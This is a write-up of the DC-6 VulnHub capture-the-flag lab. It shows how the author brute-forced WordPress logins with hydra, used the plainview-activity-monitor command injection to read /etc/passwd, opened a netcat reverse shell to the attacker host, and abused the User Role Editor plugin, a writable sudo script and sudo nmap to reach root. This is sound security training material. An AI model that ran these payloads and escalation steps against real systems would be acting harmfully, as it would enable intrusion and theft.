# DC: 6
[VulnHub link](https://www.vulnhub.com/entry/dc-6,315/)  
By DCAU

* Note: On some occasions below, the IP address might not match because this machine was revisited after some time.

## Enumeration ##
* As with all of the previous iterations of the DC-series, we are first greeted with a login page that requires users to specify both the username and the password:
![](/screenshots/dc-6/loginInitial.jpg)
* Common login credentials such as `admin:admin` and `admin:password` do not work.
* Run `nmap 10.0.2.*`, where we find 5 live hosts:
![](/screenshots/dc-6/nmapScan.jpg)
* After eliminating our own IP address and our router gateway IP address, it is very likely that the vulnerable VM's IP address is `10.0.2.16`.
* The host is running 2 services, SSH at port 22 and HTTP at port 80. Both ports are found to be open.
* Run `nmap -p- -A 10.0.2.16`:
![](/screenshots/dc-6/hostFullScan.jpg)
* Looking at the services which the vulnerable VM is running, we can see OpenSSH running at port 22 and our familiar Apache web server running on port 80.
* Trying to visit `http://10.0.2.16` results in a visit to `http://wordy/` instead.
* Edit our `/etc/hosts` file with an entry `10.0.2.16 wordy`:
![](/screenshots/dc-6/hostsFile.jpg)
* Note: The author of this challenge gave an explicit hint in the page under Technical Information stating that the hosts file will definitely need to be edited.
* Head back to our browser and refresh the page (i.e. visit `http://wordy/`) and our familiar WordPress CMS greets us:
![](/screenshots/dc-6/siteWebServer.jpg)
* There is only a Welcome, About Us and Contact Us page, and the contents of the pages do not appear to be the standard, unedited, template WordPress messages that would greet us usually.
* I tried to get the `robots.txt`, but it returned me a Not Found message.
* Heading to the login page next at `/wp-login.php`, I found out that the username `admin` exists. Common login credentials do not work.
* We will next use our trusty `hydra` to find out admin's password for us.
* But before we do so, let us use Burp Suite to confirm the parameters that we are sending as part of a login attempt:
![](/screenshots/dc-6/wordPressLoginBurpSuiteIntercept.jpg)
* There is also a hint given by the author of this challenge in the page under the `Clue` section that we should run `cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt` to save time. `rockyou.txt` by itself is a huge wordlist and the author wants us to focus our efforts in solving other parts of the challenge, by not spending too much time on the dictionary attack. The curated wordlist that we are using contains only words with the substring `k01`, and has only 2668 entries.
* Run `hydra -l admin -P passwords.txt wordy http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^:S=Dashboard'`.
* Note: Only `log` and `pwd` parameters are required for the brute-forcing to work - I tried to remove the other parameters for an intercepted request and the response came back the same.
* No positive results were returned: turns out that admin's password is not within the list. Some other user's password is likely to be within it though. Run `wpscan --url http://wordy --enumerate u` to find out if there are any other usernames:
![](/screenshots/dc-6/wordPressUserList.jpg)
* There are 4 users whom we were unaware of previously: `sarah`, `graham`, `mark` and `jens`. Let us add these 4 names into `usernames.txt`.
* Now, we will run `hydra` again, but without attempting to get admin's password: `hydra -L usernames.txt -P passwords.txt wordy http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^:S=Dashboard'`.
* Note for hydra command: Instead of defining the success string as "Dashboard", we can define the negative string as "incorrect", and the command will still work the same.
![](/screenshots/dc-6/hydraPasswordResults.jpg)
* We managed to get a set of credentials: `mark:helpdesk01`.

## Logging in as Mark ##
* After logging in as `mark`, we find out that there is 1 post titled `Hello world!` - nothing special.
![](/screenshots/dc-6/wordPressPost.jpg)
* The `Tools` section reveals nothing either.
* Going to the `Users` section, we are able to see the some details of all the users (except admin which is not displayed at all). Some user roles are customised, such as `Help Desk` and `Senior Developer`, i.e. they did not come with the default WordPress install.
![](/screenshots/dc-6/wordPressUserAndRoleList.jpg)
* Having the role of a `Help Desk` is not very helpful to us - we do not have anything near administrative privileges.
* There is also an Activity Monitor plugin activated, which is essentially an activity log of all users (including guests). The logs of the creator are also present, where the last entry is dated `2019-04-25 16:24:23`. Nothing exceptional here either it appears.
![](/screenshots/dc-6/activityMonitorLogs.jpg)
* Next, let us try to figure out what we are able to do with our role as a `Help Desk`. It seems like we are able to make a new post and add a new user.
* My excitement was short-lived as I found out that we could only draft posts and `Submit for Review`, i.e. our post never actually gets published, and is stuck with the `Pending` label.
![](/screenshots/dc-6/pendingPost.jpg)
* Let us try to see what we can do with adding new users. As expected, it would not be so straightforward where we can add a user of administrative role, but there are a total of 5 other roles that we can explore, besides the current `Help Desk` role. 
![](/screenshots/dc-6/addUserRoles.jpg)
* Note: There is also the option of adding multiple roles to one user, but I did not find that to be a functional feature. Selecting all of the roles only results in one role being the 'real' role - `Subscriber`.
* Note: While we are able to add users, we are not allowed to edit any user's information, except our own.
* It turns out that the option to assign a new user one of the roles out of the 5 in the list is a sham - no matter what role you assign the new user to, it would turn out to be `Subscriber`.
* Being a `Subscriber`, our roles are even more limited - we cannot do anything except make changes to our own profile.
![](/screenshots/dc-6/subscriberCapabilities.jpg)
* At this point I felt somewhat stuck - I tried passwords of the other 3 users by concatenating their roles with `01`, e.g. `editor01` but to no avail. The reason was that mark's role was `Help Desk` and his password was `helpdesk01`.
* Next, I tried to log in to SSH with `mark:helpdesk01` but to no avail either.
* Doing a dictionary attack with our 5 usernames and passwords and `passwords.txt` did not work either: `hydra -L usernames.txt -P passwords.txt 10.0.2.16 ssh`.
![](/screenshots/dc-6/hydraSSHFailed.jpg)
* Next, I reused `wpscan` to get a fuller picture of the WordPress site using `wpscan -v --url http://wordy`:
![](/screenshots/dc-6/wpscanFullNoPlugins.jpg)
* The first piece of information that I tried to use to get a shell was the fact that the Apache's version is `2.4.25`. There is a `Apache < 2.2.34 / < 2.4.27 - OPTIONS Memory Leak` found [here](https://www.exploit-db.com/exploits/42745), which I tried to no avail (no idea why).
![](/screenshots/dc-6/optionsBleed.jpg)
* The next piece of information was the fact that `xmlrpc` was running, and I attempted two versions of a python script which would utilise it for brute-forcing found [here](https://github.com/1N3/Wordpress-XMLRPC-Brute-Force-Exploit). v1 resulted in multiple errors while v2 resulted in an empty output (no idea why).
* The last piece of information seen in the screenshot is the `readme.html` file, which did not provide anything useful.
* Am pretty stuck at this point in time, and only then realised that I had missed out looking for vulnerabilities within the plugins of the WordPress site! Run `wpscan -v --plugins-detection aggressive --url http://wordy`:
![](/screenshots/dc-6/wpscanPlugins.jpg)
* Note: Using the option `--enumerate -ap` (all plugins) will result in no plugins being detected, because it runs `via Passive Methods`. Thus, the aggressive option has to be used. From what I understand in a [question raised on their GitHub issues page](https://github.com/wpscanteam/wpscan/issues/845), passive mode only scans for plugins at the starting page, with no intrusive scans performed.
* There are 3 plugins identified: `akismet`, `plainview-activity-monitor` and `user-role-editor`. The latter 2 have vulnerabilities that result in a Remote Command Execution (RCE) and Privilege Escalation respectively, ones that are more interesting that akismet's unauthenticated stored XSS. Hence, we will try out the latter 2 first.

## Method 1: Remote Command Execution using plainview-activity-monitor ##
* The GitHub reference link given by `wpscan` is invalid. The link is not entirely incorrect - perhaps the file was renamed because only the last part of the link is incorrect. The correct link is [here](https://github.com/aas-n/CVE/tree/master/CVE-2018-15877).
* Open `poc.html`, and have a look.
* Alternatively, instead of using the given POC, we can simply inject the command via the user interface!
* Inspecting the textfield element for `IP or integer`, we see that there is a maximum length imposed on the input element, which is 15 characters.
![](/screenshots/dc-6/ipTextFieldMaxLength.jpg)
* We will have to modify the value to something bigger (by double-clicking on the value), so that we can enter our command, e.g. 100.
* Next, enter `www.google.com | cat /etc/passwd`, then press `Lookup`:
![](/screenshots/dc-6/successfulCommandInjectionPasswordFile)
* And volia, our command `cat /etc/passwd` is executed!
* Note: We can type `google.com` instead, leaving out the `www` prefix if you would like to do so.
* Note: Having our user input solely as `cat /etc/passwd` or `| cat /etc/passwd` does not work, and will result in a delay in seeing the output because the plugin is trying to resolve the command string using `dig` (remember that we saw `Output from dig:` as part of the output alongside the contents of the password file).
* We can also use Burp Suite to carry out the command injection. This is how a normal POST request looks like after pressing `Lookup`.
![](/screenshots/dc-6/burpSuiteNormalRequest.jpg)
* Having intercepted the request, we will now modify it to include `| cat /etc/passwd` under the `ip` parameter content, where our injected command will allow us to view the `/etc/passwd` file.
![](/screenshots/dc-6/burpSuiteModifiedRequest.jpg)
* Press `Forward` after that, and volia, we have executed our desired command.
* Next, we will set up our `netcat` listener on our Kali VM terminal by running `nc -v -l -p 1234`, and then inject our `netcat` command to get our shell by entering `www.google.com | nc 10.0.2.4 1234 -e /bin/sh`, before then pressing `Lookup`:
![](/screenshots/dc-6/ncEstablishShell.jpg)
* Note: Remember to change `maxlength` attribute value first before doing the command injection!

## Method 2.1: Manual WordPress Privilege Escalation using User Role Editor ##
* I found this [article](http://sec.sangfor.com/vulns/321.html) to have given me a better understanding of how I can carry out the privilege escalation, as compared to the [Wordfence article](https://www.wordfence.com/blog/2016/04/user-role-editor-vulnerability/) that explained better the underlying code that resulted in the vulnerability.
* Using Burp Suite, intercept the request when we press `Update Profile`, as user `mark`.
* While we are able to explicitly select additional roles for new users when creating them, we do not see the option to add additional roles for ourself as `mark` (probably because of security concerns).
* However, we are still able to indirectly do so by including it as part of the POST request to update our own profile: concatenate the string `&ure_other_roles=administrator` (as explained in the article) to the end of the long string of parameters.
![](/screenshots/dc-6/burpSuiteAddAdminRole.jpg)
* `Forward` the next couple of requests, and we will then see that we are now having the `administrator` role!
![](/screenshots/dc-6/userRoleEditorPluginPrivEsc.jpg)
* Get a reverse shell by uploading the code contents to either themes or plugins, and catch it using `netcat`. I did not manage to get this part working because of this error despite multiple attempts:
![](/screenshots/dc-6/wordPressReverseShellError.jpg)
* Note: I could have uploaded a `malicious-wordpress-plugin` instead (which I did not attempt), but wanted to try my hand at a direct edit, which worked before.

## Method 2.2: Metasploit Privilege Escalation using User Role Editor ##
* When I tried to remove my role as an administrator to try using Metasploit to do this, I could not do so somehow - and had to reset the machine.
* When I saw an [Exploit-DB page for the exploit](https://www.exploit-db.com/exploits/44595) that had it as a Metasploit module, I tried for awhile to find it after running `msfconsole`. I ran a `search` using various parts of the name but to no avail.
* Only then did it dawn upon me that I had to manually add it as a module in this case. Turns out that Metasploit looks for its modules in 2 locations: `/usr/share/metasploit-framework/modules/` primarily and `~/.msf4/modules/` for custom modules, according to [OffSec's post](https://www.offensive-security.com/metasploit-unleashed/modules-and-locations/). Silly me.
* I ran `searchsploit WordPress Plugin User Role Editor` and found 2 results. What we are looking at is found in `/usr/share/exploitdb/exploits/php/webapps/44595.rb`.
* Copy the file into our custom modules directory: `cp /usr/share/exploitdb/exploits/php/webapps/44595.rb /root/.msf4/modules/exploits/php/webapps/` - and we get an error to say that the directory does not exist. Because this is my first time introducing a custom module, the modules directory was empty. We have to manually `mkdir` those 3 missing directories, before running the `cp` command again.
* Run `updatedb` on Metasploit, and while it does not give any success/failure messages, the database has been updated and we have to restart Metasploit.
* **Important**: I have always been running msfconsole with a database error message at the very beginning. Without running the database `service postgresql start`, `updatedb` does not work.
* After successfully updating the database, we are able to search for our custom module by its numerical identifier `44595`:
![](/screenshots/dc-6/metasploitModuleAdded.jpg)
* However, I was unable to load it:
![](/screenshots/dc-6/metasploitUnableToLoad.jpg)
* I am currently checking in with others who might be familiar with these 4 error messages found in the log file at `/root/.msf4/logs/framework.log` when I tried to load the module. I was not able to find anyone with a similar error message through Google:
![](/screenshots/dc-6/metasploitErrorLogs.jpg)
* To-be-continued...

# Reverse Shell Connection Established
* We have our shell now, and we are user `www-data` as expected.
* Run `python -c 'import pty; pty.spawn("/bin/bash")'` to spawn our interactive TTY shell.
* Next, run `find / -user root -perm -4000 -print 2>/dev/null` to search for setuid binaries which we can possibly exploit:
![](/screenshots/dc-6/setuidBinaries.jpg)
* Nothing special in the list, so let us try `sudo -l`. However, I realised that we were required to enter the password for user `www-data`, which we do not have. Looking back at the 2 occasions where we used this command in the dc series, it was used when we were logged in as normal users rather than as `www-data`.
* I decided to find out the OS version that the web server was running, using `cat /etc/issue; uname -a`:
![](/screenshots/dc-6/vulnerableOSVersion.jpg)
* Since the OS is `Debian GNU/Linux 9`, I found an exploit [here](https://www.exploit-db.com/exploits/41240) that would provide us with privilege escalation. After using `wget` to upload the script to the `/tmp` directory of the vulnerable web server, it turned out that there was no `make` available. Hence, the exploit could not be carried out:
![](/screenshots/dc-6/failedExploitNoMake.jpg)
* I had also downloaded the [unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check), and used `wget` to upload the script, but to no avail when it came to execution:
![](/screenshots/dc-6/failedPrivEscCheck.jpg)
* Next, I remembered that we had several other user accounts on the WordPress CMS, and headed to `/home`, and found the directories named `graham`, `jens`, `mark` and `sarah`:
![](/screenshots/dc-6/homeDirectory.jpg)
* Note: This concept of having several users' directories with different hints and content is the same as that for `dc-4`.
* Going through the respective directories' contents, I found an interesting `things-to-do.txt` file in the directory `stuff` within the directory of `mark`:
![](/screenshots/dc-6/homeDirectoryContents.jpg)
* Opening up mark's to-do list, we find the password of user `graham`, which is `GSo7isUM1D4`!
![](/screenshots/dc-6/thingsToDoTextFile.jpg)
* It made sense - having the role of a `Help Desk`, `mark` would create new users for them.
* I had also realised that there was a `backups.sh` within the directory of `jen`. Opening up the script to examine its contents shows us that it is supposed to upzip `backups.tar.gz` to `/var/www/html`, but it appears that the .tar.gz file was not in the directory - hmm.
* Note: I re-downloaded the vulnerable VM and ran it fresh, just in case I messed something up - but the expected compressed file was still missing.
![](/screenshots/dc-6/backupsScript.jpg)
* However, running the script does not work at the moment, as expected because our current user is not `jens`, nor does our current user belong to group `devs`:
![](/screenshots/dc-6/jensBackupsErrorMessage.jpg)

## Logging in as Graham ##
* Next, I decided to switch to user `graham`: `su graham`, and entered his password that we had just discovered.
* Note: `su mark` with `helpdesk01` does not work.
* I headed back to run `backups.sh`, after figuring out that `graham` belonged to the group `devs`, where those who were part of the group would have the same permissions as `jens`, the file creator in this case. However, the script was still unsuccessfully executed (as expected because `backups.tar.gz` is missing), but we made some 'headway' still, as compared to running it as user `www-data`.
![](/screenshots/dc-6/jensBackupsErrorMessageGraham.jpg)
* I ran `sudo -l` next, remembering that this command would probably work now, as compared to being executed under user `www-data`:
![](/screenshots/dc-6/sudoCommandsGraham.jpg)
* The output of `sudo -l` gave us just about the same finding that we had just derived - that we can run `backups.sh` as user `jens`.
* At this point I thought that we are pretty much stuck because the `backups.tar.gz` file is missing from our directory. We cannot remove the shell script and replace it with our own because the permissions of our uploaded shell script would then be different.
* I tried to use the `nano` text editor to edit `backups.sh` (since we had read, write and execute permissions for the file), but an error occured. `vi` did not seem to work properly, so I ran `echo /bin/bash > backups.sh` as a last resort.
* The `echo` command would completely overwrite the contents of the file with our `/bin/bash` command.
* Note: We can replace `/bin/bash` with `/bin/sh` - there is no difference between the two, but the former provides a nicer interface.
* Having said so, we would next run `backups.sh` as user `jens`, allowing us to spawn a shell with the identity of `jens`: `sudo -u jens ./backups.sh`.
![](/screenshots/dc-6/escalateAsUserJens.jpg)

## Logging in as Jens & Privilege Escalation (to root) ##
* Next, I ran `sudo -l` to see what commands that we can run as another user, and it turns out that we can run `nmap` as `root`!
![](/screenshots/dc-6/sudoCommandsJens.jpg)
* Note: The use of `nmap` for privilege escalation is similar to `mr-robot-1`.
* Its version is `7.4.0`, much newer than the `3.8.1` one we encountered before. Hence, we are unable to run `nmap --interactive` to escalate our privileges.
![](/screenshots/dc-6/nmapVersionPrivilegeEscalation.jpg)
* In that case, we have to find another way for privilege escalation.
* Run these 3 commands:
1. `TF=$(mktemp)` - create a temporary file in the `/tmp` directory, and then assign the name of this file to the `$TF` variable.
2. `echo 'os.execute("/bin/sh")' > $TF` - the command is inserted into the temporary file using the `echo` command.
3. `sudo nmap --script=$TF` - the script is executed with the help of `nmap`.
* And we are `root`!
![](/screenshots/dc-6/privilegeEscalationRoot.jpg)
* Note: I was not entirely sure if I interpreted the 3 commands correctly as I had derived them from another walkthrough, without explanation.
* Alternatively, create a file in `/tmp` ourselves, and then insert the command inside, before lastly executing `sudo nmap --script=shell.sh`. This made things clearer in my opinion.
![](/screenshots/dc-6/nmapVersionPrivilegeEscalationAlternative.jpg)
* Note: We cannot simply insert `/bin/sh` into the temporary file because the file's contents are interpreted in scripting language, rather than just a stand-alone command.
* Note: Running `sudo nmap --script='os.execute("/bin/sh")'` instead of the 3 commands results in an error because the `--script=` parameter is expecting a filename or directory. Hence, we had to split the command up and executing them consecutively.
* Note: Using `/bin/bash` instead gives a nicer interface to our newly spawned shell:
![](/screenshots/dc-6/privilegeEscalationRootBash.jpg)
* Head to `/root` directory, and open up `theflag.txt` - and we are done with the challenge!
![](/screenshots/dc-6/flag.jpg)

# Concluding Remarks
There were some methods that I had missed out when attempting this challenge, although they should have been pretty obvious given that I had attempted them in one way or another before. This led to me digging down holes which I should not have done so.

Overall, nothing too challenging given what we had conquered before, except the last part for me.

1. Learnt to re-visit previous knowledge and consolidate them.
2. Learnt about other ways to escalate privileges with `nmap`.

# References
1. https://www.hackingarticles.in/dc6-lab-walkthrough/
2. https://windsorwebdeveloper.com/dc-6-vulnhub-walkthrough/